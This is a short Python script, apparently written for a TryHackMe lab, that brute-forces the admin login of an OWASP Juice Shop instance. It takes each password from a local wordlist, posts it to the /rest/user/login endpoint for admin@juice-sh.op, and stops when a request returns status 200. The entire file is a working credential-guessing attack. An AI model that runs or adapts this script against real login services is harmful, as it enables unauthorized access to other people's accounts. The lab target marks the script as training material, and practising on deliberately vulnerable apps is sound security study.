import requests
import re

url = "http://10.10.212.76/rest/user/login"


pass_file = open('/home/captnsagz/tryhackme/wordlist/best1050.txt')
passwords = pass_file.readlines()
for password in passwords:
    print("[!] Trying : " + password)
    params = {'email':'admin@juice-sh.op', 'password' : password.strip("\n")}
    response = requests.post(url, json=params)
    print("[!]Reponse : " + response.text + " [!] status code : ", response.status_code)
    if response.status_code == 200:
        print("[+] Here is the password : " + password)
        print(len(response.text))
        break